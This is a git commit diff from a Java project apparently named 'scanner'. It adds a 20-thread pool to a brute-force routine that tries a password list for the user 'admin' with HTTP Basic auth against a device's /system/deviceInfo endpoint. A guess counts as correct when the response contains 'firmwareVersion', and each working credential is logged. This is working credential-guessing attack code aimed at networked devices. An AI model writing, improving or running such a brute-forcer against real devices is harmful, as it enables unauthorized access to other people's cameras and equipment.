931712b853593a7bee3a50c0b308558fbec3e8cc
inkarnadin <nasyrovvad@gmail.com>
2021-02-16 16:40:39 +0300

    feat: add threading for brute

--- src/main/java/scanner/BruteForceScanner.java
+++ src/main/java/scanner/BruteForceScanner.java
@@ -1,14 +1,16 @@
 package scanner;
 
 import lombok.Data;
+import lombok.SneakyThrows;
 import lombok.extern.slf4j.Slf4j;
-import okhttp3.Response;
-import okhttp3.ResponseBody;
 import scanner.http.HttpClient;
 
-import java.io.IOException;
-import java.util.Base64;
-import java.util.Objects;
+import java.util.HashSet;
+import java.util.List;
+import java.util.Optional;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.Future;
 
 @Data
 @Slf4j
@@ -17,19 +19,19 @@ public class BruteForceScanner {
     private final String BRUTE = "http://%s/system/deviceInfo";
     private final HttpClient client = new HttpClient();
 
+    @SneakyThrows
     public void brute(String ip, String[] passwords) {
-        for (String pass : passwords) {
-            String auth = new String(Base64.getEncoder().encode(String.format("admin:%s", pass).getBytes()));
-            try (Response response = client.execute(String.format(BRUTE, ip), auth)) {
-                ResponseBody responseBody = response.body();
-                if (Objects.nonNull(responseBody)) {
-                    String body = responseBody.string();
-                    if (body.contains("firmwareVersion")) {
-                        log.info(ip + " => admin:" + pass);
-                        break;
-                    }
-                }
-            } catch (IOException ignored) { }
+        ExecutorService executorService = Executors.newFixedThreadPool(20);
+
+        HashSet<BruteForceExecutor> requests = new HashSet<>();
+        for (int i = 0; i < passwords.length; i++) {
+            if (requests.size() == 20 || i == passwords.length - 1) {
+                List<Future<Optional<String>>> futures = executorService.invokeAll(requests);
+                for (Future<Optional<String>> future : futures)
+                    future.get().ifPresent(log::info);
+                requests.clear();
+            }
+            requests.add(new BruteForceExecutor(client, ip, passwords[i]));
         }
     }
 
